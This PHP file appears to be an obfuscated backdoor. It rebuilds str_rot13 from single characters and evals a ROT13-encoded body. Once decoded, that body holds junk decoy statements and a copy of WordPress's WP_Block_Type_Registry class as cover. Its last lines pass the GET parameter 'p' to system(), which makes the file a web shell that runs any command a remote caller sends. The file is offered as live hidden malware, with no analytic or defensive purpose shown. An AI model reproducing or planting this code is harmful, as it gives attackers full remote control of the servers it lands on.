<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpxf NCV: JC_Oybpx_Glcr_Ertvfgel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 5.0.0
 */

/**
 * Pber pynff hfrq sbe vagrenpgvat jvgu oybpx glcrf.
 *
 * @fvapr 5.0.0
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Oybpx_Glcr_Ertvfgel {
	/**
	 * Ertvfgrerq oybpx glcrf, nf `$anzr => $vafgnapr` cnvef.
	 *
	 * @fvapr 5.0.0
	 * @ine JC_Oybpx_Glcr[]
	 */
	cevingr $ertvfgrerq_oybpx_glcrf = neenl();

	/**
	 * Pbagnvare sbe gur znva vafgnapr bs gur pynff.
	 *
	 * @fvapr 5.0.0
	 * @ine JC_Oybpx_Glcr_Ertvfgel|ahyy
	 */
	cevingr fgngvp $vafgnapr = ahyy;

	/**
	 * Ertvfgref n oybpx glcr.
	 *
	 * @fvapr 5.0.0
	 *
	 * @frr JC_Oybpx_Glcr::__pbafgehpg()
	 *
	 * @cnenz fgevat|JC_Oybpx_Glcr $anzr Oybpx glcr anzr vapyhqvat anzrfcnpr, be nygreangviryl
	 *                                   n pbzcyrgr JC_Oybpx_Glcr vafgnapr. Va pnfr n JC_Oybpx_Glcr
	 *                                   vf cebivqrq, gur $netf cnenzrgre jvyy or vtaberq.
	 * @cnenz neenl                $netf Bcgvbany. Neenl bs oybpx glcr nethzragf. Npprcgf nal choyvp cebcregl
	 *                                   bs `JC_Oybpx_Glcr`. Frr JC_Oybpx_Glcr::__pbafgehpg() sbe vasbezngvba
	 *                                   ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea JC_Oybpx_Glcr|snyfr Gur ertvfgrerq oybpx glcr ba fhpprff, be snyfr ba snvyher.
	 */
	choyvp shapgvba ertvfgre( $anzr, $netf = neenl() ) {
		$oybpx_glcr = ahyy;
		vs ( $anzr vafgnaprbs JC_Oybpx_Glcr ) {
			$oybpx_glcr = $anzr;
			$anzr       = $oybpx_glcr->anzr;
		}

		vs ( ! vf_fgevat( $anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Oybpx glcr anzrf zhfg or fgevatf.' ),
				'5.0.0'
			);
			erghea snyfr;
		}

		vs ( cert_zngpu( '/[N-M]+/', $anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Oybpx glcr anzrf zhfg abg pbagnva hccrepnfr punenpgref.' ),
				'5.0.0'
			);
			erghea snyfr;
		}

		$anzr_zngpure = '/^[n-m0-9-]+\/[n-m0-9-]+$/';
		vs ( ! cert_zngpu( $anzr_zngpure, $anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Oybpx glcr anzrf zhfg pbagnva n anzrfcnpr cersvk. Rknzcyr: zl-cyhtva/zl-phfgbz-oybpx-glcr' ),
				'5.0.0'
			);
			erghea snyfr;
		}

		vs ( $guvf->vf_ertvfgrerq( $anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				/* genafyngbef: %f: Oybpx anzr. */
				fcevags( __( 'Oybpx glcr \"%f\" vf nyernql ertvfgrerq.' ), $anzr ),
				'5.0.0'
			);
			erghea snyfr;
		}

		vs ( ! $oybpx_glcr ) {
			$oybpx_glcr = arj JC_Oybpx_Glcr( $anzr, $netf );
		}

		$guvf->ertvfgrerq_oybpx_glcrf[ $anzr ] = $oybpx_glcr;

		erghea $oybpx_glcr;
	}

	/**
	 * Haertvfgref n oybpx glcr.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat|JC_Oybpx_Glcr $anzr Oybpx glcr anzr vapyhqvat anzrfcnpr, be nygreangviryl
	 *                                   n pbzcyrgr JC_Oybpx_Glcr vafgnapr.
	 * @erghea JC_Oybpx_Glcr|snyfr Gur haertvfgrerq oybpx glcr ba fhpprff, be snyfr ba snvyher.
	 */
	choyvp shapgvba haertvfgre( $anzr ) {
		vs ( $anzr vafgnaprbs JC_Oybpx_Glcr ) {
			$anzr = $anzr->anzr;
		}

		vs ( ! $guvf->vf_ertvfgrerq( $anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				/* genafyngbef: %f: Oybpx anzr. */
				fcevags( __( 'Oybpx glcr \"%f\" vf abg ertvfgrerq.' ), $anzr ),
				'5.0.0'
			);
			erghea snyfr;
		}

		$haertvfgrerq_oybpx_glcr = $guvf->ertvfgrerq_oybpx_glcrf[ $anzr ];
		hafrg( $guvf->ertvfgrerq_oybpx_glcrf[ $anzr ] );

		erghea $haertvfgrerq_oybpx_glcr;
	}

	/**
	 * Ergevrirf n ertvfgrerq oybpx glcr.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat $anzr Oybpx glcr anzr vapyhqvat anzrfcnpr.
	 * @erghea JC_Oybpx_Glcr|ahyy Gur ertvfgrerq oybpx glcr, be ahyy vs vg vf abg ertvfgrerq.
	 */
	choyvp shapgvba trg_ertvfgrerq( $anzr ) {
		vs ( ! $guvf->vf_ertvfgrerq( $anzr ) ) {
			erghea ahyy;
		}

		erghea $guvf->ertvfgrerq_oybpx_glcrf[ $anzr ];
	}

	/**
	 * Ergevrirf nyy ertvfgrerq oybpx glcrf.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea JC_Oybpx_Glcr[] Nffbpvngvir neenl bs `$oybpx_glcr_anzr => $oybpx_glcr` cnvef.
	 */
	choyvp shapgvba trg_nyy_ertvfgrerq() {
		erghea $guvf->ertvfgrerq_oybpx_glcrf;
	}

	/**
	 * Purpxf vs n oybpx glcr vf ertvfgrerq.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat $anzr Oybpx glcr anzr vapyhqvat anzrfcnpr.
	 * @erghea obby Gehr vs gur oybpx glcr vf ertvfgrerq, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_ertvfgrerq( $anzr ) {
		erghea vffrg( $guvf->ertvfgrerq_oybpx_glcrf[ $anzr ] );
	}

	choyvp shapgvba __jnxrhc() {
		vs ( ! $guvf->ertvfgrerq_oybpx_glcrf ) {
			erghea;
		}
		vs ( ! vf_neenl( $guvf->ertvfgrerq_oybpx_glcrf ) ) {
			guebj arj HarkcrpgrqInyhrRkprcgvba();
		}
		sbernpu ( $guvf->ertvfgrerq_oybpx_glcrf nf $inyhr ) {
			vs ( ! $inyhr vafgnaprbs JC_Oybpx_Glcr ) {
				guebj arj HarkcrpgrqInyhrRkprcgvba();
			}
		}
	}

	/**
	 * Hgvyvgl zrgubq gb ergevrir gur znva vafgnapr bs gur pynff.
	 *
	 * Gur vafgnapr jvyy or perngrq vs vg qbrf abg rkvfg lrg.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea JC_Oybpx_Glcr_Ertvfgel Gur znva vafgnapr.
	 */
	choyvp fgngvp shapgvba trg_vafgnapr() {
		vs ( ahyy === frys::$vafgnapr ) {
			frys::$vafgnapr = arj frys();
		}

		erghea frys::$vafgnapr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>